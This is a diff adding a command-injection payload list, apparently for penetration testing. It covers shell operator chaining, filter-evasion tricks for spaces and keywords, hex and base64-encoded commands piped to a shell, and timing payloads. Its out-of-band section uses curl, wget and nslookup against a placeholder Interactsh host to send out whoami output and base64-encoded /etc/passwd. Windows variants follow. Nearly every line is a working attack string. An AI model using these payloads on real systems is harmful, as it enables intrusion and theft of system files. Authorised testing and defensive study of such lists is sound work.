@@ -1,0 +1,77 @@
+# Command Injection Payloads
+# Classic + chaining + WAF bypass + blind OOB
+
+# ── Basic injection operators ─────────────────────────────────────────────────
+; id
+| id
+|| id
+& id
+&& id
+` id `
+$(id)
+{id}
+
+# ── Combined operators ────────────────────────────────────────────────────────
+test; id
+test | id
+test || id
+test & id
+test && id
+test `id`
+test $(id)
+1; ls -la
+1 | cat /etc/passwd
+1 && cat /etc/passwd
+
+# ── Space bypass ─────────────────────────────────────────────────────────────
+cat${IFS}/etc/passwd
+cat%09/etc/passwd            # tab
+cat</etc/passwd
+{cat,/etc/passwd}
+cat$IFS/etc/passwd
+X=$'\x20'&&cat${X}/etc/passwd
+
+# ── String concatenation bypass ───────────────────────────────────────────────
+c''at /etc/passwd
+c"a"t /etc/passwd
+ca\t /etc/passwd
+/bin/c?t /etc/passwd         # wildcard
+/bin/ca* /etc/passwd
+
+# ── Path bypass ───────────────────────────────────────────────────────────────
+/etc/pa*wd
+/etc/pass??d
+/???/p?ss??
+
+# ── Encoded bypasses ─────────────────────────────────────────────────────────
+%3B id                        # ;
+%7C id                        # |
+%26 id                        # &
+$(printf "\x63\x61\x74") /etc/passwd   # cat via printf hex
+$(echo 'Y2F0IC9ldGMvcGFzc3dk'|base64 -d|sh)  # base64 encoded
+
+# ── Blind via sleep ───────────────────────────────────────────────────────────
+; sleep 5
+| sleep 5
+&& sleep 5
+` sleep 5 `
+$(sleep 5)
+; ping -c 5 127.0.0.1
+
+# ── Blind OOB (use your Interactsh / Burp Collaborator URL) ──────────────────
+; curl https://YOUR.interactsh.com/`whoami`
+; wget http://YOUR.interactsh.com/?`id|base64`
+; nslookup YOUR.interactsh.com
+$(curl -s http://YOUR.interactsh.com/$(cat /etc/passwd | base64 | tr -d '\n'))
+
+# ── Windows ───────────────────────────────────────────────────────────────────
+& whoami
+| whoami
+&& whoami
+; whoami
+%26 whoami
+^whoami
+%0awhoami
+cmd /c whoami
+powershell -c whoami
+ping -n 5 127.0.0.1
